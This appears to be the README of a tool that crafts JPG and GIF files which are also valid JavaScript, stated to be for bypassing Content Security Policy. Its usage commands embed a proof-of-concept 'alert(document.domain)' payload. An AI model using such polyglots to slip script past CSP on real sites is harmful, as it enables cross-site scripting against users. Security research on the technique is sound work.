# Image Polyglot

This program can craft a valid image that is simultaneously a valid and executable javascript file (polyglot). Its main use is to bypass `CSP`.

Main inspiration came from this article.

https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs

## Usage
### JPG
```bash
./img_polygloter.py jpg --height 123 --width 321 --payload "alert(document.domain);" --output jpg_poly.js
```

### GIF
```bash
./img_polygloter.py gif --payload "alert(document.domain);" --output gif_poly.js
```

# TODO
- gif dimensions, if possible
- png crafting